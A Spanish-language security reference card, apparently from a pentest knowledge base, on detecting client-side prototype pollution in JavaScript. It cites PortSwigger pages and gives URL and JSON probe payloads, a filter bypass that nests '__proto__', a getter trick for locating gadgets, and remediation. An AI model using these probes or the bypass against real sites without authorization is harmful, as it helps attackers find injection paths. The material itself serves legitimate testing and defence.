---
clase: inyeccion
tech: javascript-client
cwe: CWE-1321
cvss: 0.0 # [derivado] paso de deteccion: sin gadget no hay impacto
payload: |
  # FUENTES - payloads LITERALES de la fuente, en orden de prueba:
  vulnerable-website.com/?__proto__[foo]=bar
  vulnerable-website.com/?__proto__.foo=bar
  #
  # VERIFICACION en la consola del navegador - LITERAL de la fuente:
  Object.prototype.foo // "bar" indicates that you have successfully polluted the prototype // undefined indicates that the attack was not successful
  #
  # FORMAS EN JSON - LITERALES de la fuente:
  { "__proto__": { "evilProperty": "payload" } }
  #
  # URL generica - LITERAL:
  https://vulnerable-website.com/?__proto__[evilProperty]=payload
  #
  # BYPASS DE FILTRO POR OFUSCACION - LITERAL de la fuente. Si el filtro ELIMINA la
  # cadena '__proto__' una sola vez, el anidamiento la reconstruye:
  vulnerable-website.com/?__pro__proto__to__.gadget=payload
  # tras eliminar el '__proto__' interno queda:
  vulnerable-website.com/?__proto__.gadget=payload
  #
  # RUTA POR CONSTRUCTOR (cuando '__proto__' esta bloqueado). La fuente da SOLO
  # expresiones JS, NO una forma de query ni de JSON:
  let myObjectLiteral = {}; let myObject = new Object();
  myObjectLiteral.constructor // function Object(){...} myObject.constructor // function Object(){...}
  myObject.constructor.prototype // Object.prototype myString.constructor.prototype // String.prototype myArray.constructor.prototype // Array.prototype
  #
  # ADVERTENCIA: '?constructor.prototype.foo=bar' y '{"constructor": ...}' NO aparecen
  # en ninguna de las cuatro paginas consultadas. No los presento como literales.
  #
  # Diferencia LITERAL que explica por que JSON.parse es peligroso:
  const objectLiteral = {__proto__: {evilProperty: 'payload'}}; const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true
precondicion: "La aplicacion fusiona entrada del usuario (query string o JSON) en un objeto sin sanear las claves. El modelo que la fuente establece: un exploit necesita TRES piezas — una FUENTE (envenena el prototipo), un GADGET (una propiedad que la app lee de forma insegura) y un SINK (innerHTML, eval, script.src...). Sin gadget no hay impacto."
como_se_descubre: |
  Metodologia LITERAL de la fuente para las fuentes: 'trial and error'. Probar
  '?__proto__[foo]=bar', comprobar 'Object.prototype.foo' en la consola, probar
  despues la notacion con punto, y si ambas fallan, la ruta por constructor.
  Para los GADGETS, la tecnica manual LITERAL de la fuente, que es lo mas valioso de
  esta pagina:
  #   Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', { get() { console.trace(); return 'polluted'; } })
  Esto instala un getter que imprime una traza de pila CADA VEZ que algo lee la
  propiedad. Convierte la busqueda de gadgets de adivinanza en observacion: la traza
  dice exactamente donde se lee, y desde ahi se sigue hasta el sink.
  Requiere activar 'Proxy > Options > Intercept server responses' y añadir un
  'debugger'. Herramienta: DOM Invader, que segun la fuente 'comes preinstalled with
  Burp's built-in browser' y 'can even generate a DOM XSS proof-of-concept in some cases'.
control_negativo: |
  # Control LITERAL de la fuente, que ya viene con su propia lectura:
  # A: ?__proto__[foo]=bar  y luego  Object.prototype.foo
  #    -> "bar"      = prototipo envenenado
  #    -> undefined  = el ataque NO funciono
  # B: [derivado] en una pestaña NUEVA, sin el parametro -> Object.prototype.foo
  #    debe ser undefined. Confirma que el envenenamiento viene del parametro y no de
  #    una pestaña previa contaminada (el prototipo persiste en la pagina cargada).
  # C: [derivado] probar notacion con punto Y con corchetes: un filtro puede cubrir
  #    una sola de las dos formas, y eso es ya un hallazgo sobre el filtro.
mata: |
  - Las claves se sanean con allowlist -> muere. La fuente advierte que una blocklist
    es 'only a stopgap' y que eliminar solo '__proto__' es defectuoso por la ruta del
    constructor y por la ofuscacion.
  - Object.freeze(Object.prototype) aplicado.
  - Objetos con prototipo nulo (Object.create(null)) o uso de Map/Set.
  - NO SE ENCUENTRA GADGET: la fuente es explicita en que sin gadget no hay exploit.
    Reportarlo igualmente, porque la fuente recomienda parchear la pollution 'even
    without an exploitable gadget': futuras actualizaciones pueden añadir gadgets.
fuente: "https://portswigger.net/web-security/prototype-pollution y sus subpaginas (client-side, server-side, preventing), mas https://portswigger.net/research/widespread-prototype-pollution-gadgets (Gareth Heyes, publicado 2022-06-22, act. 2022-10-28). Payloads y tecnica del getter literales. Sin CVE ni recompensas en ninguna de las paginas. ADVERTENCIA: el render colapso los saltos de linea del codigo."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Prototype pollution — detección de fuentes y el truco del getter para hallar gadgets

## Principio
En JavaScript, escribir en `Object.prototype` afecta a **todos** los objetos que no
definan esa propiedad. Si la aplicación fusiona entrada del usuario en un objeto sin
sanear las claves, el atacante puede inyectar valores que aparecen en cualquier objeto
de la página.

La fuente establece un modelo de tres piezas que conviene respetar: una **fuente** que
envenena el prototipo, un **gadget** (una propiedad que la aplicación lee de forma
insegura) y un **sink** (`innerHTML`, `eval`, `script.src`). Sin gadget no hay impacto —
y eso tiene consecuencias directas para cómo se reporta.

## Payload
```
vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar
```

```json
{ "__proto__": { "evilProperty": "payload" } }
```

La verificación, con su propia lectura incluida en la fuente:

```javascript
Object.prototype.foo // "bar" indicates that you have successfully polluted the prototype // undefined indicates that the attack was not successful
```

## El bypass por anidamiento
Si el filtro **elimina** la cadena `__proto__` una sola vez, el anidamiento la
reconstruye:

```
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

Al borrar el `__proto__` interior queda `?__proto__.gadget=payload`. Es el mismo error
que el filtro de CodePen en el writeup de Jade: una sustitución de una pasada sobre una
cadena que el atacante controla por completo.

## El truco que convierte la caza de gadgets en observación
Esta es la pieza más valiosa de la fuente:

```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', { get() { console.trace(); return 'polluted'; } })
```

Instala un getter que imprime una **traza de pila cada vez que algo lee la propiedad**.
Deja de ser adivinanza: la traza dice exactamente en qué fichero y línea se lee, y desde
ahí se sigue el valor hasta el sink. Es la diferencia entre probar nombres de propiedad a
ciegas y leer el comportamiento real de la aplicación.

Requiere activar `Proxy > Options > Intercept server responses` y añadir un `debugger`.
Como alternativa automatizada, DOM Invader —que según la fuente *"comes preinstalled with
Burp's built-in browser"* y *"can even generate a DOM XSS proof-of-concept in some
cases"*.

## Por qué `JSON.parse` importa
```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}}; const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true
```

Un literal de objeto trata `__proto__` como el prototipo; `JSON.parse` lo trata como una
**propiedad propia normal**. Por eso los datos que entran por JSON son una fuente
especialmente fértil, y por eso una API que acepta JSON es más expuesta que una que
parsea una query.

## Nota de procedencia
`?constructor.prototype.foo=bar` y `{"constructor": ...}` circulan mucho como payloads de
esta clase, pero **no aparecen en ninguna de las cuatro páginas consultadas**: la fuente
da la ruta del constructor solo como expresiones JavaScript, no como forma de query ni
de JSON. No los presento como literales suyos.

## Reportar incluso sin gadget
La fuente es explícita: hay que parchear la pollution *aunque no se encuentre un gadget
explotable*, porque código futuro o una actualización de librería pueden añadir uno. Eso
cambia cómo se escribe el informe: la fuente es el defecto, el gadget solo determina la
severidad de hoy.

## Remediación
De la fuente: sanear las claves con **allowlist** (una blocklist es *"only a stopgap"*, y
eliminar solo `__proto__` es defectuoso por el constructor y la ofuscación); congelar el
prototipo con `Object.freeze(Object.prototype);`; usar objetos de prototipo nulo
(`Object.create(null)`) o las alternativas `Map` y `Set`.

Y del paper, como defensa en profundidad: *"A good defence in depth measure is to use
objects with a null prototype when using these APIs"*, más *"scan any library you write
or use for gadgets before deploying it."*
